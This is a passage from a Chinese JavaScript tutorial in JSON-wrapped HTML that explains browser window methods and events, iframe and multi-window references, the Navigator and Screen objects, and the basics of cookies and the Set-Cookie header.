&#039;smooth&#039;\n});</code></pre><p><code>window.scroll()</code>方法是<code>window.scrollTo()</code>方法的别名。</p>\n<p><code>window.scrollBy()</code>方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.scrollBy(0, window.innerHeight)</code></pre><p>上面代码用于将网页向下滚动一屏。</p>\n<p>如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。</p>\n<ul>\n<li>Element.scrollTop</li>\n<li>Element.scrollLeft</li>\n<li>Element.scrollIntoView()</li>\n</ul>\n\n        <h3>\n            <a href='#window.print()' class='header-anchor'>#</a>\n            <span>window.print()</span>\n        </h3>\n    <p><code>window.print</code>方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。</p>\n<p>常见的打印按钮代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>document.getElementById(&#039;printLink&#039;).onclick = function () {\n  window.print();\n}</code></pre><p>非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (typeof window.print === &#039;function&#039;) {\n  // 支持打印功能\n}</code></pre>\n        <h3>\n            <a href='#window.focus()，window.blur()' class='header-anchor'>#</a>\n            <span>window.focus()，window.blur()</span>\n        </h3>\n    <p><code>window.focus()</code>方法会激活窗口，使其获得焦点，出现在其他窗口的前面。</p>\n<pre class=\"prettyprint language-javascript\"><code>var popup = window.open(&#039;popup.html&#039;, &#039;Popup Window&#039;);\n\nif ((popup !== null) &amp;&amp; !popup.closed) {\n  popup.focus();\n}</code></pre><p>上面代码先检查<code>popup</code>窗口是否依然存在，确认后激活该窗口。</p>\n<p><code>window.blur()</code>方法将焦点从窗口移除。</p>\n<p>当前窗口获得焦点时，会触发<code>focus</code>事件；当前窗口失去焦点时，会触发<code>blur</code>事件。</p>\n\n        <h3>\n            <a href='#window.getSelection()' class='header-anchor'>#</a>\n            <span>window.getSelection()</span>\n        </h3>\n    <p><code>window.getSelection</code>方法返回一个<code>Selection</code>对象，表示用户现在选中的文本。</p>\n<pre class=\"prettyprint language-javascript\"><code>var selObj = window.getSelection();</code></pre><p>使用<code>Selction</code>对象的<code>toString</code>方法可以得到选中的文本。</p>\n<pre class=\"prettyprint language-javascript\"><code>var selectedText = selObj.toString();</code></pre>\n        <h3>\n            <a href='#window.getComputedStyle()，window.matchMedia()' class='header-anchor'>#</a>\n            <span>window.getComputedStyle()，window.matchMedia()</span>\n        </h3>\n    <p><code>window.getComputedStyle()</code>方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。</p>\n<p><code>window.matchMedia()</code>方法用来检查 CSS 的<code>mediaQuery</code>语句，详见《CSS 操作》一章。</p>\n\n        <h2>\n            <a href='#事件' class='header-anchor'>#</a>\n            <span>事件</span>\n        </h2>\n    <p><code>window</code>对象可以接收以下事件。</p>\n\n        <h3>\n            <a href='#load-事件和-onload-属性' class='header-anchor'>#</a>\n            <span>load 事件和 onload 属性</span>\n        </h3>\n    <p><code>load</code>事件发生在文档在浏览器窗口加载完毕时。<code>window.onload</code>属性可以指定这个事件的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onload = function() {\n  var elements = document.getElementsByClassName(&#039;example&#039;);\n  for (var i = 0; i &lt; elements.length; i++) {\n    var elt = elements[i];\n    // ...\n  }\n};</code></pre><p>上面代码在网页加载完毕后，获取指定元素并进行处理。</p>\n\n        <h3>\n            <a href='#error-事件和-onerror-属性' class='header-anchor'>#</a>\n            <span>error 事件和 onerror 属性</span>\n        </h3>\n    <p>浏览器脚本发生错误时，会触发<code>window</code>对象的<code>error</code>事件。我们可以通过<code>window.onerror</code>属性对该事件指定回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onerror = function (message, filename, lineno, colno, error) {\n  console.log(&quot;出错了！--&gt; %s&quot;, error.stack);\n};</code></pre><p>由于历史原因，<code>window</code>的<code>error</code>事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。</p>\n<ul>\n<li>出错信息</li>\n<li>出错脚本的网址</li>\n<li>行号</li>\n<li>列号</li>\n<li>错误对象</li>\n</ul>\n<p>老式浏览器只支持前三个参数。</p>\n<p>并不是所有的错误，都会触发 JavaScript 的<code>error</code>事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。</p>\n<p>下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.onerror = function(msg, url, line) {\n  if (onerror.num++ &gt; onerror.max) {\n    alert(&#039;ERROR: &#039; + msg + &#039;\\n&#039; + url + &#039;:&#039; + line);\n    return true;\n  }\n}\nonerror.max = 3;\nonerror.num = 0;</code></pre><p>需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置<code>Access-Control-Allow-Origin</code>的 HTTP 头信息。</p>\n<pre class=\"prettyprint language-bash\"><code>Access-Control-Allow-Origin: *</code></pre><p>然后，在网页的<code>&lt;script&gt;</code>标签中设置<code>crossorigin</code>属性。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;script crossorigin=&quot;anonymous&quot; src=&quot;//example.com/file.js&quot;&gt;&lt;/script&gt;</code></pre><p>上面代码的<code>crossorigin=&quot;anonymous&quot;</code>表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为<code>crossorigin=&quot;use-credentials&quot;</code>，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息<code>Access-Control-Allow-Credentials</code>。</p>\n\n        <h3>\n            <a href='#window-对象的事件监听属性' class='header-anchor'>#</a>\n            <span>window 对象的事件监听属性</span>\n        </h3>\n    <p>除了具备元素节点都有的 GlobalEventHandlers 接口，<code>window</code>对象还具有以下的事件监听函数属性。</p>\n<ul>\n<li><code>window.onafterprint</code>：<code>afterprint</code>事件的监听函数。</li>\n<li><code>window.onbeforeprint</code>：<code>beforeprint</code>事件的监听函数。</li>\n<li><code>window.onbeforeunload</code>：<code>beforeunload</code>事件的监听函数。</li>\n<li><code>window.onhashchange</code>：<code>hashchange</code>事件的监听函数。</li>\n<li><code>window.onlanguagechange</code>: <code>languagechange</code>的监听函数。</li>\n<li><code>window.onmessage</code>：<code>message</code>事件的监听函数。</li>\n<li><code>window.onmessageerror</code>：<code>MessageError</code>事件的监听函数。</li>\n<li><code>window.onoffline</code>：<code>offline</code>事件的监听函数。</li>\n<li><code>window.ononline</code>：<code>online</code>事件的监听函数。</li>\n<li><code>window.onpagehide</code>：<code>pagehide</code>事件的监听函数。</li>\n<li><code>window.onpageshow</code>：<code>pageshow</code>事件的监听函数。</li>\n<li><code>window.onpopstate</code>：<code>popstate</code>事件的监听函数。</li>\n<li><code>window.onstorage</code>：<code>storage</code>事件的监听函数。</li>\n<li><code>window.onunhandledrejection</code>：未处理的 Promise 对象的<code>reject</code>事件的监听函数。</li>\n<li><code>window.onunload</code>：<code>unload</code>事件的监听函数。</li>\n</ul>\n\n        <h2>\n            <a href='#多窗口操作' class='header-anchor'>#</a>\n            <span>多窗口操作</span>\n        </h2>\n    <p>由于网页可以使用<code>iframe</code>元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。</p>\n\n        <h3>\n            <a href='#窗口的引用' class='header-anchor'>#</a>\n            <span>窗口的引用</span>\n        </h3>\n    <p>各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。</p>\n<ul>\n<li><code>top</code>：顶层窗口，即最上层的那个窗口</li>\n<li><code>parent</code>：父窗口</li>\n<li><code>self</code>：当前窗口，即自身</li>\n</ul>\n<p>下面代码可以判断，当前窗口是否为顶层窗口。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (window.top === window.self) {\n  // 当前窗口是顶层窗口\n} else {\n  // 当前窗口是子窗口\n}</code></pre><p>下面的代码让父窗口的访问历史后退一次。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.parent.history.back();</code></pre><p>与这些变量对应，浏览器还提供一些特殊的窗口名，供<code>window.open()</code>方法、<code>&lt;a&gt;</code>标签、<code>&lt;form&gt;</code>标签等引用。</p>\n<ul>\n<li><code>_top</code>：顶层窗口</li>\n<li><code>_parent</code>：父窗口</li>\n<li><code>_blank</code>：新窗口</li>\n</ul>\n<p>下面代码就表示在顶层窗口打开链接。</p>\n<pre class=\"prettyprint language-html\"><code>&lt;a href=&quot;somepage.html&quot; target=&quot;_top&quot;&gt;Link&lt;/a&gt;</code></pre>\n        <h3>\n            <a href='#iframe-元素' class='header-anchor'>#</a>\n            <span>iframe 元素</span>\n        </h3>\n    <p>对于<code>iframe</code>嵌入的窗口，<code>document.getElementById</code>方法可以拿到该窗口的 DOM 节点，然后使用<code>contentWindow</code>属性获得<code>iframe</code>节点包含的<code>window</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var frame = document.getElementById(&#039;theFrame&#039;);\nvar frameWindow = frame.contentWindow;</code></pre><p>上面代码中，<code>frame.contentWindow</code>可以拿到子窗口的<code>window</code>对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 获取子窗口的标题\nframeWindow.title</code></pre><p><code>&lt;iframe&gt;</code>元素的<code>contentDocument</code>属性，可以拿到子窗口的<code>document</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var frame = document.getElementById(&#039;theFrame&#039;);\nvar frameDoc = frame.contentDocument;\n\n// 等同于\nvar frameDoc = frame.contentWindow.document;</code></pre><p><code>&lt;iframe&gt;</code>元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用<code>window.postMessage</code>方法。</p>\n<p><code>&lt;iframe&gt;</code>窗口内部，使用<code>window.parent</code>引用父窗口。如果当前页面没有父窗口，则<code>window.parent</code>属性返回自身。因此，可以通过<code>window.parent</code>是否等于<code>window.self</code>，判断当前窗口是否为<code>iframe</code>窗口。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (window.parent !== window.self) {\n  // 当前窗口是子窗口\n}</code></pre><p><code>&lt;iframe&gt;</code>窗口的<code>window</code>对象，有一个<code>frameElement</code>属性，返回<code>&lt;iframe&gt;</code>在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于<code>null</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f1Element = document.getElementById(&#039;f1&#039;);\nvar f1Window = f1Element.contentWindow;\n\nf1Window.frameElement === f1Element // true\nwindow.frameElement === null // true</code></pre>\n        <h3>\n            <a href='#window.frames-属性' class='header-anchor'>#</a>\n            <span>window.frames 属性</span>\n        </h3>\n    <p><code>window.frames</code>属性返回一个类似数组的对象，成员是所有子窗口的<code>window</code>对象。可以使用这个属性，实现窗口之间的互相引用。比如，<code>frames[0]</code>返回第一个子窗口，<code>frames[1].frames[2]</code>返回第二个子窗口内部的第三个子窗口，<code>parent.frames[1]</code>返回父窗口的第二个子窗口。</p>\n<p>注意，<code>window.frames</code>每个成员的值，是框架内的窗口（即框架的<code>window</code>对象），而不是<code>iframe</code>标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用<code>window.frames[0].document</code>的写法。</p>\n<p>另外，如果<code>&lt;iframe&gt;</code>元素设置了<code>name</code>或<code>id</code>属性，那么属性值会自动成为全局变量，并且可以通过<code>window.frames</code>属性引用，返回子窗口的<code>window</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>// HTML 代码为 &lt;iframe id=&quot;myFrame&quot;&gt;\nwindow.myFrame // [HTMLIFrameElement]\nframes.myframe === myFrame // true</code></pre><p>另外，<code>name</code>属性的值会自动成为子窗口的名称，可以用在<code>window.open</code>方法的第二个参数，或者<code>&lt;a&gt;</code>和<code>&lt;frame&gt;</code>标签的<code>target</code>属性。</p>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"Navigator 对象，Screen 对象","link":"/bom/navigator.html"}],"content":"\n        <h1>\n            <a href='#Navigator-对象，Screen-对象。' class='header-anchor'>#</a>\n            <span>Navigator 对象，Screen 对象。</span>\n        </h1>\n    <p><code>window.navigator</code>属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。</p>\n\n        <h2>\n            <a href='#Navigator-对象的属性' class='header-anchor'>#</a>\n            <span>Navigator 对象的属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#Navigator.userAgent' class='header-anchor'>#</a>\n            <span>Navigator.userAgent</span>\n        </h3>\n    <p><code>navigator.userAgent</code>属性返回浏览器的 User Agent 字符串，表示浏览器的厂商和版本信息。</p>\n<p>下面是 Chrome 浏览器的<code>userAgent</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.userAgent\n// &quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36&quot;</code></pre><p>通过<code>userAgent</code>属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JavaScript 功能。</p>\n<p>不过，通过<code>userAgent</code>可以大致准确地识别手机浏览器，方法就是测试是否包含<code>mobi</code>字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var ua = navigator.userAgent.toLowerCase();\n\nif (/mobi/i.test(ua)) {\n  // 手机浏览器\n} else {\n  // 非手机浏览器\n}</code></pre><p>如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>/mobi|android|touch|mini/i.test(ua)</code></pre>\n        <h3>\n            <a href='#Navigator.plugins' class='header-anchor'>#</a>\n            <span>Navigator.plugins</span>\n        </h3>\n    <p><code>Navigator.plugins</code>属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。</p>\n<pre class=\"prettyprint language-javascript\"><code>var pluginsLength = navigator.plugins.length;\n\nfor (var i = 0; i &lt; pluginsLength; i++) {\n  console.log(navigator.plugins[i].name);\n  console.log(navigator.plugins[i].filename);\n  console.log(navigator.plugins[i].description);\n  console.log(navigator.plugins[i].version);\n}</code></pre>\n        <h3>\n            <a href='#Navigator.platform' class='header-anchor'>#</a>\n            <span>Navigator.platform</span>\n        </h3>\n    <p><code>Navigator.platform</code>属性返回用户的操作系统信息，比如<code>MacIntel</code>、<code>Win32</code>、<code>Linux x86_64</code>等 。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.platform\n// &quot;Linux x86_64&quot;</code></pre>\n        <h3>\n            <a href='#Navigator.onLine' class='header-anchor'>#</a>\n            <span>Navigator.onLine</span>\n        </h3>\n    <p><code>navigator.onLine</code>属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.onLine // true</code></pre><p>有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的<code>onLine</code>属性会返回<code>true</code>，所以不能假定只要是<code>true</code>，用户就一定能访问互联网。不过，如果是<code>false</code>，可以断定用户一定离线。</p>\n<p>用户变成在线会触发<code>online</code>事件，变成离线会触发<code>offline</code>事件，可以通过<code>window.ononline</code>和<code>window.onoffline</code>指定这两个事件的回调函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.addEventListener(&#039;offline&#039;, function(e) { console.log(&#039;offline&#039;); });\nwindow.addEventListener(&#039;online&#039;, function(e) { console.log(&#039;online&#039;); });</code></pre>\n        <h3>\n            <a href='#Navigator.language，Navigator.languages' class='header-anchor'>#</a>\n            <span>Navigator.language，Navigator.languages</span>\n        </h3>\n    <p><code>Navigator.language</code>属性返回一个字符串，表示浏览器的首选语言。该属性只读。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.language // &quot;en&quot;</code></pre><p><code>Navigator.languages</code>属性返回一个数组，表示用户可以接受的语言。<code>Navigator.language</code>总是这个数组的第一个成员。HTTP 请求头信息的<code>Accept-Language</code>字段，就来自这个数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.languages  // [&quot;en-US&quot;, &quot;en&quot;, &quot;zh-CN&quot;, &quot;zh&quot;, &quot;zh-TW&quot;]</code></pre><p>如果这个属性发生变化，就会在<code>window</code>对象上触发<code>languagechange</code>事件。</p>\n\n        <h3>\n            <a href='#Navigator.geolocation' class='header-anchor'>#</a>\n            <span>Navigator.geolocation</span>\n        </h3>\n    <p><code>Navigator.geolocation</code>属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。</p>\n<p>Geolocation 对象提供下面三个方法。</p>\n<ul>\n<li>Geolocation.getCurrentPosition()：得到用户的当前位置</li>\n<li>Geolocation.watchPosition()：监听用户位置变化</li>\n<li>Geolocation.clearWatch()：取消<code>watchPosition()</code>方法指定的监听函数</li>\n</ul>\n<p>注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。</p>\n\n        <h3>\n            <a href='#Navigator.cookieEnabled' class='header-anchor'>#</a>\n            <span>Navigator.cookieEnabled</span>\n        </h3>\n    <p><code>Navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.cookieEnabled // true</code></pre><p>注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时<code>cookieEnabled</code>返回的还是<code>true</code>。</p>\n\n        <h2>\n            <a href='#Navigator-对象的方法' class='header-anchor'>#</a>\n            <span>Navigator 对象的方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#Navigator.javaEnabled()' class='header-anchor'>#</a>\n            <span>Navigator.javaEnabled()</span>\n        </h3>\n    <p><code>Navigator.javaEnabled()</code>方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。</p>\n<pre class=\"prettyprint language-javascript\"><code>navigator.javaEnabled() // false</code></pre>\n        <h3>\n            <a href='#Navigator.sendBeacon()' class='header-anchor'>#</a>\n            <span>Navigator.sendBeacon()</span>\n        </h3>\n    <p><code>Navigator.sendBeacon()</code>方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。</p>\n\n        <h2>\n            <a href='#Screen-对象' class='header-anchor'>#</a>\n            <span>Screen 对象</span>\n        </h2>\n    <p>Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。<code>window.screen</code>属性指向这个对象。</p>\n<p>该对象有下面的属性。</p>\n<ul>\n<li><code>Screen.height</code>：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。</li>\n<li><code>Screen.width</code>：浏览器窗口所在的屏幕的宽度（单位像素）。</li>\n<li><code>Screen.availHeight</code>：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于<code>height</code>减去那些被系统组件的高度。</li>\n<li><code>Screen.availWidth</code>：浏览器窗口可用的屏幕宽度（单位像素）。</li>\n<li><code>Screen.pixelDepth</code>：整数，表示屏幕的色彩位数，比如<code>24</code>表示屏幕提供24位色彩。</li>\n<li><code>Screen.colorDepth</code>：<code>Screen.pixelDepth</code>的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。</li>\n<li><code>Screen.orientation</code>：返回一个对象，表示屏幕的方向。该对象的<code>type</code>属性是一个字符串，表示屏幕的具体方向，<code>landscape-primary</code>表示横放，<code>landscape-secondary</code>表示颠倒的横放，<code>portrait-primary</code>表示竖放，<code>portrait-secondary</code>。</li>\n</ul>\n<p>下面是<code>Screen.orientation</code>的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>window.screen.orientation\n// { angle: 0, type: &quot;landscape-primary&quot;, onchange: null }</code></pre><p>下面的例子保证屏幕分辨率大于 1024 x 768。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (window.screen.width &gt;= 1024 &amp;&amp; window.screen.height &gt;= 768) {\n  // 分辨率不低于 1024x768\n}</code></pre><p>下面是根据屏幕的宽度，将用户导向不同网页的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>if ((screen.width &lt;= 800) &amp;&amp; (screen.height &lt;= 600)) {\n  window.location.replace(&#039;small.html&#039;);\n} else {\n  window.location.replace(&#039;wide.html&#039;);\n}</code></pre>"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"浏览器模型","link":"javascript:void(0)"},{"title":"cookie","link":"/bom/cookie.html"}],"content":"\n        <h1>\n            <a href='#Cookie' class='header-anchor'>#</a>\n            <span>Cookie</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    <p>Cookie 是服务器保存在浏览器的一小段文本信息，每个 Cookie 的大小一般不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。</p>\n<p>Cookie 主要用来分辨两个请求是否来自同一个浏览器，以及用来保存一些状态信息。它的常用场合有以下一些。</p>\n<ul>\n<li>对话（session）管理：保存登录、购物车等需要记录的信息。</li>\n<li>个性化：保存用户的偏好，比如网页的字体大小、背景色等等。</li>\n<li>追踪：记录和分析用户行为。</li>\n</ul>\n<p>有些开发者使用 Cookie 作为客户端储存。这样做虽然可行，但是并不推荐，因为 Cookie 的设计目标并不是这个，它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端储存应该使用 Web storage API 和 IndexedDB。</p>\n<p>Cookie 包含以下几方面的信息。</p>\n<ul>\n<li>Cookie 的名字</li>\n<li>Cookie 的值（真正的数据写在这里面）</li>\n<li>到期时间</li>\n<li>所属域名（默认是当前域名）</li>\n<li>生效的路径（默认是当前网址）</li>\n</ul>\n<p>举例来说，用户访问网址<code>www.example.com</code>，服务器在浏览器写入一个 Cookie。这个 Cookie 就会包含<code>www.example.com</code>这个域名，以及根路径<code>/</code>。这意味着，这个 Cookie 对该域名的根路径和它的所有子路径都有效。如果路径设为<code>/forums</code>，那么这个 Cookie 只有在访问<code>www.example.com/forums</code>及其子路径时才有效。以后，浏览器一旦访问这个路径，浏览器就会附上这段 Cookie 发送给服务器。</p>\n<p>浏览器可以设置不接受 Cookie，也可以设置不向服务器发送 Cookie。<code>window.navigator.cookieEnabled</code>属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 浏览器是否打开 Cookie 功能\nwindow.navigator.cookieEnabled // true</code></pre><p><code>document.cookie</code>属性返回当前网页的 Cookie。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 当前网页的 Cookie\ndocument.cookie</code></pre><p>不同浏览器对 Cookie 数量和大小的限制，是不一样的。一般来说，单个域名设置的 Cookie 不应超过30个，每个 Cookie 的大小不能超过4KB。超过限制以后，Cookie 将被忽略，不会被设置。</p>\n<p>浏览器的同源政策规定，两个网址只要域名相同和端口相同，就可以共享 Cookie（参见《同源政策》一章）。注意，这里不要求协议相同。也就是说，<code>http://example.com</code>设置的 Cookie，可以被<code>https://example.com</code>读取。</p>\n\n        <h2>\n            <a href='#Cookie-与-HTTP-协议' class='header-anchor'>#</a>\n            <span>Cookie 与 HTTP 协议</span>\n        </h2>\n    <p>Cookie 由 HTTP 协议生成，也主要是供 HTTP 协议使用。</p>\n\n        <h3>\n            <a href='#HTTP-回应：Cookie-的生成' class='header-anchor'>#</a>\n            <span>HTTP 回应：Cookie 的生成</span>\n        </h3>\n    <p>服务器如果希望在浏览器保存 Cookie，就要在 HTTP 回应的头信息里面，放置一个<code>Set-Cookie</code>字段。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie:foo=bar</code></pre><p>上面代码会在浏览器保存一个名为<code>foo</code>的 Cookie，它的值为<code>bar</code>。</p>\n<p>HTTP 回应可以包含多个<code>Set-Cookie</code>字段，即在浏览器生成多个 Cookie。下面是一个例子。</p>\n<pre class=\"prettyprint language-http\"><code>HTTP/1.0 200 OK\nContent-type: text/html\nSet-Cookie: yummy_cookie=choco\nSet-Cookie: tasty_cookie=strawberry\n\n[page content]</code></pre><p>除了 Cookie 的值，<code>Set-Cookie</code>字段还可以附加 Cookie 的属性。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure\nSet-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</code></pre><p>上面的几个属性的含义，将在后文解释。</p>\n<p>一个<code>Set-Cookie</code>字段里面，可以同时包括多个属性，没有次序的要求。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;; Secure; HttpOnly</code></pre><p>下面是一个例子。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</code></pre><p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的<code>key</code>、<code>domain</code>、<code>path</code>和<code>secure</code>都匹配。举例来说，如果原始的 Cookie 是用如下的<code>Set-Cookie</code>设置的。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: key1=value1; domain=example.com; path=/blog</code></pre><p>改变上面这个 Cookie 的值，就必须使用同样的<code>Set-Cookie</code>。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: key1=value2; domain=example.com; path=/blog</code></pre><p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: key1=value2; domain=example.com; path=/</code></pre><p>上面的命令设置了一个全新的同名 Cookie，但是<code>path</code>属性不一样。下一次访问<code>example.com/blog</code>的时候，浏览器将向服务器发送两个同名的 Cookie。</p>\n<pre class=\"prettyprint language-http\"><code>Cookie: key1=value1; key1=value2</code></pre><p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p>\n\n        <h3>\n            <a href='#HTTP-请求：Cookie-的发送' class='header-anchor'>#</a>\n            <span>HTTP 请求：Cookie 的发送</span>\n        </h3>\n    <p>浏览器向服务器发送 HTTP 请求时，每个请求都会带上相应的 Cookie。也就是说，把服务器早前保存在浏览器的这段信息，再发回服务器。这时要使用 HTTP 头信息的<code>Cookie</code>字段。</p>\n<pre class=\"prettyprint language-http\"><code>Cookie: foo=bar</code></pre><p>上面代码会向服务器发送名为<code>foo</code>的 Cookie，值为<code>bar</code>。</p>\n<p><code>Cookie</code>字段可以包含多个 Cookie，使用分号（<code>;</code>）分隔。</p>\n<pre class=\"prettyprint language-http\"><code>Cookie: name=value; name2=value2; name3=value3</code></pre><p>下面是一个例子。</p>\n<pre class=\"prettyprint language-http\"><code>GET /sample_page.html HTTP/1.1\nHost: www.example.org\nCookie: yummy_cookie=choco; tasty_cookie=strawberry</code></pre><p>服务器收到浏览器发来的 Cookie 时，有两点是无法知道的。</p>\n<ul>\n<li>Cookie 的各种属性，比如何时过期。</li>\n<li>哪个域名设置的 Cookie，到底是一级域名设的，还是某一个二级域名设的。</li>\n</ul>\n\n        <h2>\n            <a href='#Cookie-的属性' class='header-anchor'>#</a>\n            <span>Cookie 的属性</span>\n        </h2>\n    \n        <h3>\n            <a href='#Expires，Max-Age' class='header-anchor'>#</a>\n            <span>Expires，Max-Age</span>\n        </h3>\n    <p><code>Expires</code>属性指定一个具体的到期时间，到了指定时间以后，浏览器就不再保留这个 Cookie。它的值是 UTC 格式，可以使用<code>Date.prototype.toUTCString()</code>进行格式转换。</p>\n<pre class=\"prettyprint language-http\"><code>Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;</code></pre><p>如果不设置该属性，或者设为<code>null</code>，Cookie 只在当前会话（session）有效，浏览器窗口一旦关闭，当前 Session 结束，该 Cookie 就会被删除。另外，浏览器根据本地时间，决定 Cookie 是否过期，由于本地时间是不精确的，所以没有办法保证 Cookie 一定会在服务器指定的时间过期。</p>\n<p><code>Max-Age</code>属性指定从现在开始 Cookie 存在的秒数，比如<code>60 * 60 * 24 * 365</code>（即一年）。过了这个时间以后，浏览器就不再保留这个 Cookie。</p>\n<p>如果同时指定了<code>Expires</code>和<code>Max-Age</code>，那么<code>Max-Age</code>的值将优先生效。</p>\n<p>如果<code>Set-Cookie</code>字段没有指定<code>Expires</code>或<code>Max-Age</code>属性，那么这个 Cookie 就是 Session Cookie，即它只在本次对话存在，一旦用户关闭浏览器，浏览器就不会再保留这个 Cookie。</p>\n\n        <h3>\n            <a href='#Domain，Path' class='header-anchor'>#</a>\n            